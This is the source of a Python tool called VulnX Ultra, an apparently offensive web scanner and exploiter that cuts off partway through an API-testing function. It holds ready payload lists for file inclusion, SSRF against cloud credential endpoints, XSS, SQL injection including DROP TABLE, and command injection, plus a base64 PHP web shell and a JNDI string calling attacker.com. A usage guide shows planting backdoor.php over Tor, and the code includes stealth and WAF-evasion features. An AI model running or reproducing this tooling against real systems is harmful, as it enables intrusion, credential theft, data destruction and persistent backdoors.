#!/usr/bin/env python3
"""
VulnX Ultra - Advanced Web Vulnerability Scanner
"""

import requests
import urllib.parse
import argparse
import concurrent.futures
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import track
from rich.markdown import Markdown
import sys
import base64
import json
import yaml
import csv
import time
from datetime import datetime
import logging
import re
import socks
import socket
import random
import hashlib
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import dns.resolver
import xml.etree.ElementTree as ET
import os

# Check if exploiter classes are defined to avoid NameError
try:
    from lfi_exploiter import LFIExploiter
except ImportError:
    LFIExploiter = None
try:
    from RFIExploiter import RFIExploiter
except ImportError:
    RFIExploiter = None
try:
    from SSRFExploiter import SSRFExploiter
except ImportError:
    SSRFExploiter = None
try:
    from XSSExploiter import XSSExploiter
except ImportError:
    XSSExploiter = None
try:
    from SQLiExploiter import SQLiExploiter
except ImportError:
    SQLiExploiter = None
try:
    from RCEExploiter import RCEExploiter
except ImportError:
    RCEExploiter = None

# Initialize Console
console = Console()

# Logging setup
logging.basicConfig(
    filename=f"vulnx_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# ASCII Art Banner
ASCII_ART = """
[bold cyan]
 ██▒   █▓ █    ██  ██▓     ▒█████   ███▄    █   ██████ 
▓██░   █▒ ██  ▓██▒▓██▒    ▒██▒  ██▒ ██ ▀█   █ ▒██    ▒ 
 ▓██  █▒░▓██  ▒██░▒██░    ▒██░  ██▒▓██  ▀█ ██▒░ ▓██▄   
  ▒██ █░░▓▓█  ░██░▒██░    ▒██   ██░▓██▒  ▐▌██▒  ▒   ██▒
   ▒▀█░  ▒▒█████▓ ░██████▒░ ████▓▒░▒██░   ▓██░▒██████▒▒
   ░ ▐░  ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░
   ░ ░░  ░░▒░ ░ ░ ░ ░ ▒  ░  ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░▒  ░ ░
     ░░   ░░░ ░ ░   ░ ░   ░ ░ ░ ▒     ░   ░ ░ ░  ░  ░  
      ░     ░         ░  ░    ░ ░           ░       ░  
[/bold cyan]
[bold yellow]             Ultra Web Vulnerability Scanner[/bold yellow]
[bold red]       LFI | RFI | SSRF | XSS | SQLi | RCE | WAF Bypass[/bold red]
"""

# Usage Guide (Updated with SQLi and RCE exploitation)
USAGE_GUIDE = """
## VulnX Ultra Usage Guide

### Basic Scanning:
- Scan for LFI: `python vulnx.py -u "http://example.com/page.php?file=test" --lfi`
- Scan for RFI: `python vulnx.py -u "http://example.com/page.php?url=test" --rfi`
- Scan for SSRF: `python vulnx.py -u "http://example.com/api/endpoint" --ssrf`
- Scan for XSS: `python vulnx.py -u "http://example.com/search?q=test" --xss`
- Scan for SQLi: `python vulnx.py -u "http://example.com/product?id=1" --sqli`
- Scan for RCE: `python vulnx.py -u "http://example.com/cmd.php?cmd=test" --rce`

### Advanced Options:
- Use Tor: `--tor`
- Use proxies: `--proxy http://proxy:port` or `--proxy-list proxies.txt`
- Custom payloads: `--custom-payload payloads.txt`
- Output results: `--output results.json` (supports json, csv, txt)
- Delay between requests: `--delay 1.5`

### Detection Modules:
- WAF Detection: `--detect-waf`
- OS Fingerprinting: `--fingerprint`
- Full stealth mode: `--stealth`
- Port scanning: `--port-scan`
- Subdomain enumeration: `--subdomains`

### Exploitation Modules:
- Exploit LFI: `--lfi --exploit-lfi`
- Exploit RFI: `--rfi --exploit-rfi --server http://your-server.com/shell.txt`
- Exploit SSRF: `--ssrf --exploit-ssrf`
- Exploit XSS: `--xss --exploit-xss`
- Exploit SQLi: `--sqli --exploit-sqli`
- Exploit RCE: `--rce --exploit-rce --server http://your-server.com/shell.php`
- Upload files after exploitation: `--upload local_file:remote_path`

### Examples:
1. Full scan with Tor: 
   `python vulnx.py -u "http://example.com/vuln.php?id=1" --lfi --rfi --ssrf --xss --sqli --rce --tor --output results.json`

2. Stealth scan with delay:
   `python vulnx.py -u "http://target.com/api" --ssrf --xss --sqli --rce --stealth --delay 2.5`

3. SQLi Exploitation:
   `python vulnx.py -u "http://target.com/product?id=1" --sqli --exploit-sqli --output sqli_report`

4. RCE Exploitation with file upload:
   `python vulnx.py -u "http://target.com/cmd.php?cmd=test" --rce --exploit-rce --server http://attacker.com/shell.php --upload backdoor.php:/var/www/html/backdoor.php`

5. SSRF Exploitation:
   `python vulnx.py -u "http://target.com/api/fetch?url=test" --ssrf --exploit-ssrf --output ssrf_results`

6. XSS Exploitation:
   `python vulnx.py -u "http://target.com/search?q=test" --xss --exploit-xss --output xss_results`
"""

# Payload Lists (Already included in original, no changes needed)
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/passwd%00",
    "../../../../etc/passwd%2500",
    "../../../../etc/passwd%00.jpg",
    "....//....//etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/..%2f..%2f..%2f..%2fetc%2fpasswd",
    "../../windows/win.ini",
    "../../../../windows/win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
    "/proc/self/environ",
    "/etc/hosts",
    "/etc/shadow",
    "/etc/group",
    "/etc/motd",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "../../../../../../../../../etc/passwd",
    "../../../../../../../../../etc/passwd%00",
    "....\\....\\....\\....\\windows\\win.ini",
    "file:///etc/passwd",
    "////etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "../../../../../../../../../../../../etc/passwd%00",
    "../../../../../../../../../../../../etc/passwd%00.html",
    "/....//....//....//etc/passwd",
    "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "zip:///path/to/file.zip#file.txt",
    "phar:///path/to/file.phar/file.txt"
]

RFI_PAYLOADS = [
    "http://{SERVER}/shell.txt",
    "https://{SERVER}/malware.php",
    "//{SERVER}/backdoor.txt",
    "\\\\{SERVER}\\malware.php",
    "http://example.com@{SERVER}/shell.php",
    "http://{SERVER}:80#@example.com/test.php",
    "http://{SERVER}?example.com",
    "http://{SERVER}\\example.com",
    "expect://whoami",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "php://input",
    "http://{SERVER}/shell.jpg?.php",
    "http://{SERVER}/.php",
    "http://{SERVER}/test.png%00.php",
    "http://{SERVER}/test.txt%20",
    "http://{SERVER}.example.com/test.php",
    "http://{SERVER}:8080/shell.php",
    "http://[::ffff:{SERVER}]/shell.php",
    "http://{SERVER}/%2e%2e/test.php",
    "http://{SERVER}/%252e%252e/test.php",
    "http://malicious.com/shell.txt",
    "https://evil.com/malware.php",
    "http://attacker.com/exploit.png",
    "//evil.com/xss.js",
    "\\\\evil.com\\malware.exe",
    "http://{YOUR_SERVER}/payload",
    "https://{YOUR_SERVER}/exploit",
    "//{YOUR_SERVER}/malware",
    "\\\\{YOUR_SERVER}\\backdoor",
    "http://example.com@malicious.com/test.txt",
    "http://malicious.com:80#@example.com/test.txt",
    "http://malicious.com?example.com",
    "http://malicious.com\\example.com",
    "expect://whoami",
    "data://text/plain;base64,SSBsb3ZlIFBIUAo=",
    "data:text/plain;base64,SSBsb3ZlIFBIUAo="
]

SSRF_PAYLOADS = [
    # Cloud Metadata Services
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1beta1/",
    "http://169.254.169.254/metadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    
    # Internal Services
    "http://127.0.0.1:80/",
    "http://localhost:8080/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:9200/",
    "http://127.0.0.1:5601/",
    "http://127.0.0.1:8080/manager/html",
    "http://localhost:2375/containers/json",
    
    # Special Protocols
    "file:///etc/passwd",
    "dict://127.0.0.1:3306/info",
    "gopher://127.0.0.1:6379/_INFO",
    "ldap://127.0.0.1:389/",
    "sftp://example.com:22/",
    "http+unix://%2Fvar%2Frun%2Fdocker.sock/info",
    
    # Bypass Techniques
    "http://2130706433/",
    "http://0177.0.0.1/",
    "http://0x7f.0.0.0x1/",
    "http://127.1/",
    "http://localhost./",
    "http://example.com@127.0.0.1/",
    "http://127.0.0.1#@attacker.com/",
    
    # Headers for SSRF
    "http://attacker.com/",
    "http://evil.com/",
    "http://malicious.com/"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "javascript:alert(1)",
    "onmouseover=alert(1)",
    "alert`1`",
    "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
    "<iframe src=\"javascript:alert(1)\">",
    "<body onload=alert(1)>",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<details/open/ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<form action=\"javascript:alert(1)\"><input type=submit>",
    "<math><maction actiontype=\"statusline#http://example.com\" href=\"javascript:alert(1)\">click",
    "<object data=\"javascript:alert(1)\">",
    "<embed src=\"javascript:alert(1)\">"
]

SQLI_PAYLOADS = [
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1#",
    "\" OR 1=1#",
    "' OR 1=1/*",
    "\" OR 1=1/*",
    "admin'--",
    "admin'#",
    "admin'/*",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT null,table_name,null FROM information_schema.tables--",
    "' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'--",
    "' UNION SELECT null,concat(username,':',password),null FROM users--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1\" AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1 AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT @@version)))",
    "1' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT @@version)))--",
    "1\" AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT @@version)))--",
    "1; DROP TABLE users--",
    "1'; DROP TABLE users--",
    "1\"; DROP TABLE users--"
]

RCE_PAYLOADS = [
    ";id",
    "|id",
    "`id`",
    "$(id)",
    "|| id",
    "&& id",
    "; system('id');",
    "| system('id');",
    "` system('id'); `",
    "$( system('id') )",
    "<?php system('id'); ?>",
    "<% Runtime.getRuntime().exec(\"id\") %>",
    "{{ system('id') }}",
    "#{ system('id') }",
    "@( system('id') )",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
]

# WAF Detection Payloads
WAF_DETECTION_PAYLOADS = [
    "../../../../etc/passwd",
    "<script>alert(1)</script>",
    "' OR 1=1--",
    "AND 1=CONVERT(int,@@version)--",
    "UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
    "'; EXEC xp_cmdshell('dir');--",
    "<?php system('id'); ?>",
    "${jndi:ldap://attacker.com/exploit}",
    "%0D%0ASet-Cookie:%20test=test",
    "../../../etc/passwd\0.jpg",
    "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
    "<img src=x onerror=alert(1)>",
    "SELECT * FROM users WHERE username='admin'--' AND password='",
    "|cat /etc/passwd",
    "`id`",
    "$(sleep 30)",
    "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
]

# WAF Signatures
WAF_SIGNATURES = {
    "Cloudflare": [
        r"cloudflare",
        r"cf-ray",
        r"__cfduid",
        r"Attention Required! \| Cloudflare"
    ],
    "Akamai": [
        r"akamai",
        r"akamaighost",
        r"ak.bmsc"
    ],
    "Imperva": [
        r"imperva",
        r"incapsula",
        r"_Incapsula_Resource"
    ],
    "AWS WAF": [
        r"aws",
        r"awsalb",
        r"awselb",
        r"aws.waf.captcha"
    ],
    "ModSecurity": [
        r"mod_security",
        r"this.error.was.generated.by.mod.security"
    ],
    "Barracuda": [
        r"barracuda",
        r"barra_counter_session"
    ],
    "F5 BIG-IP": [
        r"bigip",
        r"f5",
        r"x-wa-info"
    ],
    "FortiWeb": [
        r"fortiweb",
        r"fortigate"
    ],
    "Sucuri": [
        r"sucuri",
        r"cloudproxy"
    ],
    "Wordfence": [
        r"wordfence",
        r"generated.by.wordfence"
    ],
    "Palo Alto": [
        r"palo.alto",
        r"panw"
    ],
    "Citrix": [
        r"citrix",
        r"netscaler"
    ]
}

# Display banner
def display_banner():
    console.print(ASCII_ART)
    console.print(Panel.fit("[bold green]VulnX Ultra - Advanced Web Vulnerability Scanner[/bold green]", 
                          subtitle="by: 𓆩Aℓ-Muhaib𓆪 "))
    console.print(f"[cyan]{'='*80}[/cyan]")

# Show usage guide
def show_usage_guide():
    console.print(Panel.fit(Markdown(USAGE_GUIDE), 
                          title="[bold yellow]VulnX Ultra Usage Guide[/bold yellow]"))

# Check Tor connection
def check_tor_connection():
    try:
        session = requests.Session()
        session.proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
        response = session.get("https://check.torproject.org/api/ip", timeout=10)
        if response.status_code == 200 and "IsTor" in response.json() and response.json()["IsTor"]:
            console.print("[green]✓ Tor connection verified and active[/green]")
            logging.info("Tor connection verified")
            return True
        console.print("[red]✗ Tor is not connected or not working properly[/red]")
        logging.error("Tor connection failed")
        return False
    except Exception as e:
        console.print(f"[red]✗ Error checking Tor: {str(e)}[/red]")
        logging.error(f"Error checking Tor: {str(e)}")
        return False

# Check proxy connection
def check_proxy_connection(proxy):
    try:
        response = requests.get("http://httpbin.org/ip", 
                              proxies={"http": proxy, "https": proxy}, 
                              timeout=10)
        if response.status_code == 200:
            console.print(f"[green]✓ Proxy {proxy} is working (IP: {response.json()['origin']})[/green]")
            logging.info(f"Proxy {proxy} verified")
            return True
        console.print(f"[red]✗ Proxy {proxy} failed (Status: {response.status_code})[/red]")
        logging.error(f"Proxy {proxy} failed")
        return False
    except Exception as e:
        console.print(f"[red]✗ Error checking proxy {proxy}: {str(e)}[/red]")
        logging.error(f"Error checking proxy {proxy}: {str(e)}")
        return False

# Get random user agent
def get_random_user_agent():
    ua = UserAgent()
    return ua.random

# Detect WAF
def detect_waf(url, proxies=None):
    console.print("[yellow]Starting WAF detection...[/yellow]")
    logging.info("Starting WAF detection")
    
    headers = {
        "User-Agent": get_random_user_agent()
    }
    
    try:
        # First send normal request
        normal_response = requests.get(url, headers=headers, timeout=10, proxies=proxies)
        
        # Then send malicious request
        malicious_headers = headers.copy()
        malicious_headers["X-Forwarded-For"] = WAF_DETECTION_PAYLOADS[0]
        malicious_response = requests.get(url, headers=malicious_headers, timeout=10, proxies=proxies)
        
        detected_wafs = []
        
        for waf_name, signatures in WAF_SIGNATURES.items():
            for signature in signatures:
                if (re.search(signature, normal_response.text, re.IGNORECASE) or 
                    re.search(signature, malicious_response.text, re.IGNORECASE) or 
                    signature.lower() in str(normal_response.headers).lower() or 
                    signature.lower() in str(malicious_response.headers).lower()):
                    if waf_name not in detected_wafs:
                        detected_wafs.append(waf_name)
        
        # Analyze status codes
        if malicious_response.status_code in [403, 406, 419, 500, 501, 503]:
            if not detected_wafs:
                detected_wafs.append("Unknown WAF")
        
        # Analyze block page content
        block_page_indicators = ["blocked", "forbidden", "access denied", "security", "waf", "protection"]
        if any(indicator in malicious_response.text.lower() for indicator in block_page_indicators):
            if not detected_wafs:
                detected_wafs.append("Generic WAF")
        
        if detected_wafs:
            console.print(f"[red]⚠ Detected WAF: {', '.join(detected_wafs)}[/red]")
            logging.info(f"Detected WAF: {', '.join(detected_wafs)}")
            return detected_wafs
        else:
            console.print("[green]✓ No known WAF detected[/green]")
            logging.info("No known WAF detected")
            return None
    except Exception as e:
        console.print(f"[red]✗ Error during WAF detection: {str(e)}[/red]")
        logging.error(f"Error during WAF detection: {str(e)}")
        return None

# Detect security systems (IPS/IDS)
def detect_security_systems(url, proxies=None):
    console.print("[yellow]Scanning for security systems (IPS/IDS)...[/yellow]")
    logging.info("Scanning for security systems")
    
    headers = {
        "User-Agent": get_random_user_agent()
    }
    
    try:
        # Send request with suspicious payload
        test_payload = "<script>alert('test')</script>"
        response = requests.get(f"{url}?test={test_payload}", headers=headers, timeout=10, proxies=proxies)
        
        security_systems = []
        
        # Analyze response for security systems
        if response.status_code == 403 and "forbidden" in response.text.lower():
            security_systems.append("Possible IPS/IDS blocking malicious requests")
        
        if "ids" in response.text.lower() or "ips" in response.text.lower():
            security_systems.append("Possible IDS/IPS detected in response")
        
        # Analyze response time (increase may indicate traffic inspection)
        start_time = time.time()
        requests.get(url, headers=headers, timeout=10, proxies=proxies)
        response_time = time.time() - start_time
        
        if response_time > 3:  # If response time exceeds 3 seconds
            security_systems.append(f"High response time ({response_time:.2f}s) - Possible traffic inspection")
        
        if security_systems:
            console.print("[red]⚠ Possible security systems detected:[/red]")
            for system in security_systems:
                console.print(f"  [yellow]- {system}[/yellow]")
            logging.info(f"Detected security systems: {security_systems}")
            return security_systems
        else:
            console.print("[green]✓ No obvious security systems detected[/green]")
            logging.info("No obvious security systems detected")
            return None
    except Exception as e:
        console.print(f"[red]✗ Error during security systems scan: {str(e)}[/red]")
        logging.error(f"Error during security systems scan: {str(e)}")
        return None

# Fingerprint OS
def fingerprint_os(url, proxies=None):
    console.print("[yellow]Starting OS fingerprinting...[/yellow]")
    logging.info("Starting OS fingerprinting")
    
    headers = {
        "User-Agent": get_random_user_agent()
    }
    
    try:
        response = requests.get(url, headers=headers, timeout=10, proxies=proxies)
        
        # Analyze server header
        server_header = response.headers.get("Server", "").lower()
        
        os_info = []
        
        # Detect OS from server header
        if "linux" in server_header:
            os_info.append("Linux")
        elif "windows" in server_header:
            os_info.append("Windows")
        elif "unix" in server_header:
            os_info.append("Unix")
        
        # Detect OS from cookies (sometimes contains OS info)
        set_cookie = response.headers.get("Set-Cookie", "").lower()
        if "win" in set_cookie:
            os_info.append("Windows")
        elif "lin" in set_cookie:
            os_info.append("Linux")
        
        # Analyze page content for OS detection
        if "powered by apache" in response.text.lower():
            os_info.append("Likely Linux (Apache)")
        elif "iis" in response.text.lower() or "microsoft" in response.text.lower():
            os_info.append("Likely Windows (IIS)")
        
        if os_info:
            detected_os = ", ".join(list(set(os_info)))  # Remove duplicates
            console.print(f"[green]✓ Detected OS: {detected_os}[/green]")
            logging.info(f"Detected OS: {detected_os}")
            return detected_os
        else:
            console.print("[yellow]⚠ Could not determine OS[/yellow]")
            logging.info("Could not determine OS")
            return None
    except Exception as e:
        console.print(f"[red]✗ Error during OS fingerprinting: {str(e)}[/red]")
        logging.error(f"Error during OS fingerprinting: {str(e)}")
        return None

# Enumerate subdomains
def enumerate_subdomains(domain, wordlist=None, proxies=None):
    console.print(f"[yellow]Starting subdomain enumeration for {domain}[/yellow]")
    logging.info(f"Starting subdomain enumeration for {domain}")
    
    if not wordlist:
        wordlist = [
            "www", "mail", "ftp", "webmail", "smtp", "pop", "ns1", "ns2", 
            "admin", "blog", "dev", "test", "staging", "api", "secure", 
            "vpn", "m", "mobile", "app", "cdn", "static", "img", "images"
        ]
    
    found_subdomains = []
    
    try:
        resolver = dns.resolver.Resolver()
        resolver.timeout = 5
        resolver.lifetime = 5
        
        for subdomain in track(wordlist, description="Enumerating subdomains..."):
            try:
                target = f"{subdomain}.{domain}"
                answers = resolver.resolve(target, 'A')
                for answer in answers:
                    found_subdomains.append(target)
                    console.print(f"[green]✓ Found subdomain: {target} ({answer})[/green]")
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout):
                continue
            except Exception as e:
                logging.error(f"Error resolving {subdomain}.{domain}: {str(e)}")
                continue
        
        if found_subdomains:
            console.print(f"[green]✓ Found {len(found_subdomains)} subdomains[/green]")
            logging.info(f"Found {len(found_subdomains)} subdomains")
            return found_subdomains
        else:
            console.print("[yellow]⚠ No subdomains found[/yellow]")
            logging.info("No subdomains found")
            return None
    except Exception as e:
        console.print(f"[red]✗ Error during subdomain enumeration: {str(e)}[/red]")
        logging.error(f"Error during subdomain enumeration: {str(e)}")
        return None

# Port scanning
def port_scan(target, ports=None, proxies=None):
    console.print(f"[yellow]Starting port scan for {target}[/yellow]")
    logging.info(f"Starting port scan for {target}")
    
    if not ports:
        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 3389, 8080]
    
    open_ports = []
    
    try:
        for port in track(ports, description="Scanning ports..."):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append(port)
                    console.print(f"[green]✓ Port {port} is open[/green]")
                sock.close()
            except Exception as e:
                logging.error(f"Error scanning port {port}: {str(e)}")
                continue
        
        if open_ports:
            console.print(f"[green]✓ Found {len(open_ports)} open ports[/green]")
            logging.info(f"Found {len(open_ports)} open ports")
            return open_ports
        else:
            console.print("[yellow]⚠ No open ports found[/yellow]")
            logging.info("No open ports found")
            return None
    except Exception as e:
        console.print(f"[red]✗ Error during port scan: {str(e)}[/red]")
        logging.error(f"Error during port scan: {str(e)}")
        return None

# Analyze response
def analyze_response(response, payload, custom_keywords=None):
    try:
        if response.status_code in [200, 500, 403, 401, 302]:
            content = response.text.lower()
            headers = str(response.headers).lower()
            
            patterns = [
                (r"root:.*:0:0:", "LFI", "Vulnerable to Local File Inclusion!"),
                (r"\[extensions\]", "LFI", "Vulnerable to Local File Inclusion (Windows)!"),
                (r"malicious|evil|attacker", "RFI", "Vulnerable to Remote File Inclusion!"),
                (r"metadata|localhost|169.254.169.254", "SSRF", "Vulnerable to Server-Side Request Forgery!"),
                (r"<script>alert\(1\)</script>", "XSS", "Vulnerable to Cross-Site Scripting!"),
                (r"sql.*syntax.*error|mysql.*error", "SQLi", "Possible SQL Injection vulnerability!"),
                (r"warning.*mysql", "SQLi", "Possible SQL Injection vulnerability!"),
                (r"unexpected.*end.*of.*input", "XSS", "Possible XSS vulnerability!"),
                (r"syntax.*error", "Code Injection", "Possible Code Injection vulnerability!"),
                (r"file.*not.*found|no.*such.*file", "LFI", "File path disclosure possible"),
                (r"directory.*traversal.*denied", "LFI", "Directory traversal attempt detected but possibly blocked"),
                (r"access.*denied|forbidden", "Security", "Access control issue detected"),
                (r"internal.*server.*error", "Server Error", "Server error may indicate vulnerability"),
                (r"command.*injection", "Command Injection", "Possible Command Injection vulnerability"),
                (r"eval\(\)'d code", "Code Injection", "Possible Code Injection vulnerability"),
                (r"include_path", "LFI", "Possible Local File Inclusion vulnerability"),
                (r"file_get_contents", "LFI", "Possible Local File Inclusion vulnerability"),
                (r"allow_url_include", "RFI", "Possible Remote File Inclusion vulnerability"),
                (r"system\(\)|shell_exec\(\)", "Command Injection", "Possible Command Injection vulnerability"),
                (r"java\.lang", "Java", "Possible Java code injection vulnerability"),
                (r"python\.", "Python", "Possible Python code injection vulnerability"),
                (r"ruby", "Ruby", "Possible Ruby code injection vulnerability"),
                (r"perl", "Perl", "Possible Perl code injection vulnerability"),
                (r"undefined.*function", "Code Injection", "Possible Code Injection vulnerability"),
                (r"mod_ssl|ssl_error_log", "SSL", "Possible SSL misconfiguration"),
                (r"open_basedir", "PHP", "PHP open_basedir restriction in effect"),
                (r"disable_functions", "PHP", "PHP disable_functions restriction in effect")
            ]
            
            if custom_keywords:
                for kw in custom_keywords:
                    patterns.append((re.escape(kw.lower()), "Custom", f"Custom keyword '{kw}' detected!"))
            
            for pattern, vuln_type, message in patterns:
                if re.search(pattern, content) or re.search(pattern, headers):
                    return vuln_type, message
            # Special analysis for status codes
            if response.status_code == 500:
                return "Server Error", "Server error detected, possible vulnerability!"
            elif response.status_code == 403:
                return "Access Denied", "Access denied, possible security control in place"
            elif response.status_code == 401:
                return "Authentication", "Authentication required, possible security control in place"
            elif response.status_code == 302:
                return "Redirection", "Redirection detected, possible security control in place"
            
        return None, None
    except Exception as e:
        logging.error(f"Error analyzing response for payload {payload}: {str(e)}")
        return None, f"Error analyzing response: {str(e)}"

# Generate dynamic payloads
def generate_dynamic_payloads(response, base_payloads, param):
    dynamic_payloads = []
    try:
        # Analyze baseline response
        content_type = response.headers.get("Content-Type", "").lower()
        server = response.headers.get("Server", "").lower()
        
        # Add payloads based on content type
        if "php" in content_type or "php" in server:
            for payload in base_payloads:
                dynamic_payloads.append(payload + "%00")
                dynamic_payloads.append(payload + "%2500")
                dynamic_payloads.append(urllib.parse.quote(payload))
                dynamic_payloads.append(payload.replace("/", "\\"))
                
        if "asp" in content_type or "iis" in server:
            for payload in base_payloads:
                dynamic_payloads.append(payload.replace("/", "\\"))
                dynamic_payloads.append(payload + ".aspx")
                
        # Add payloads based on status codes
        if response.status_code == 404:
            for payload in base_payloads:
                dynamic_payloads.append(payload + "%00")
                dynamic_payloads.append(payload.replace("..", "....//"))
                dynamic_payloads.append(payload.replace("../", "..\\"))
                
        # Add parameter-specific payloads
        if "file" in param.lower():
            dynamic_payloads.extend([
                f"php://filter/convert.base64-encode/resource={param}",
                f"zip://{param}",
                f"phar://{param}"
            ])
            
        return list(set(dynamic_payloads))  # Remove duplicates
    except Exception as e:
        logging.error(f"Error generating dynamic payloads: {str(e)}")
        return []

# Test payload in stealth mode
def stealth_test_payload(url, payload, param, encode=False, os_type="linux", proxies=None, custom_keywords=None, delay=0):
    try:
        # Setup stealth headers
        headers = {
            "User-Agent": get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Referer": "https://www.google.com/",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        }
        
        # Modify payload based on OS
        if os_type == "windows" and "etc/passwd" in payload:
            payload = payload.replace("/etc/passwd", "\\windows\\win.ini")
        
        original_payload = payload
        payloads_to_test = [payload]
        
        # Apply encoding if requested
        if encode:
            payloads_to_test.append(urllib.parse.quote(payload))
            payloads_to_test.append(base64.b64encode(payload.encode()).decode())
            payloads_to_test.append(hashlib.md5(payload.encode()).hexdigest())
            payloads_to_test.append("".join([f"%{ord(c):02x}" for c in payload]))
        
        results = []
        for test_payload in payloads_to_test:
            # Build URL with payload
            if "?" in url:
                test_url = f"{url}&{param}={test_payload}"
            else:
                test_url = f"{url}?{param}={test_payload}"
            
            # Send request with random delay
            time.sleep(delay + random.uniform(0, 1.5))
            
            try:
                response = requests.get(test_url, headers=headers, timeout=10, proxies=proxies)
                
                # Analyze response
                vuln_type, message = analyze_response(response, test_payload, custom_keywords)
                if vuln_type:
                    results.append({
                        "payload": original_payload,
                        "url": test_url,
                        "type": vuln_type,
                        "message": message,
                        "status": response.status_code,
                        "response_time": response.elapsed.total_seconds()
                    })
            except requests.RequestException as e:
                logging.error(f"Error testing payload {test_payload}: {str(e)}")
                results.append({
                    "payload": test_payload,
                    "url": test_url,
                    "type": "Error",
                    "message": str(e),
                    "status": None,
                    "response_time": None
                })
        
        return results
    except Exception as e:
        logging.error(f"Error in stealth_test_payload: {str(e)}")
        return [{
            "payload": payload,
            "url": url,
            "type": "Error",
            "message": str(e),
            "status": None,
            "response_time": None
        }]

# Test URL with payloads
def test_url(url, payloads, param, encode=False, os_type="linux", proxies=None, 
             custom_keywords=None, delay=0, stealth=False, threads=10):
    results = []
    try:
        # Create baseline response
        headers = {"User-Agent": get_random_user_agent()}
        baseline_response = requests.get(url, headers=headers, timeout=10, proxies=proxies)
        
        # Generate dynamic payloads
        dynamic_payloads = generate_dynamic_payloads(baseline_response, payloads, param)
        all_payloads = list(set(payloads + dynamic_payloads))
        
        console.print(f"[cyan]Total payloads to test: {len(all_payloads)}[/cyan]")
        logging.info(f"Testing {len(all_payloads)} payloads against {url}")
        
        # Choose test function based on stealth mode
        test_function = stealth_test_payload if stealth else stealth_test_payload
        
        # Execute tests with ThreadPoolExecutor
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            future_to_payload = {
                executor.submit(test_function, url, payload, param, encode, os_type, 
                              proxies, custom_keywords, delay): payload
                for payload in all_payloads
            }
            
            for future in track(concurrent.futures.as_completed(future_to_payload), 
                              total=len(all_payloads), 
                              description="Testing payloads..."):
                try:
                    results.extend(future.result())
                except Exception as e:
                    logging.error(f"Error processing payload result: {str(e)}")
                    console.print(f"[red]Error processing payload: {str(e)}[/red]")
                    
    except Exception as e:
        logging.error(f"Error in test_url: {str(e)}")
        console.print(f"[red]Error in scanning: {str(e)}[/red]")
    
    return results

# Test API endpoint
def test_api(endpoint, method="GET", payloads=None, proxies=None, 
            custom_keywords=None, delay=0, stealth=False):
    if not payloads:
        payloads = SSRF_PAYLOADS
    
    results = []
    try:
        console.print(f"[cyan]Testing API endpoint with {len(payloads)} payloads[/cyan]")
        logging.info(f"Testing API endpoint with {len(payloads)} payloads")
        
        headers = {
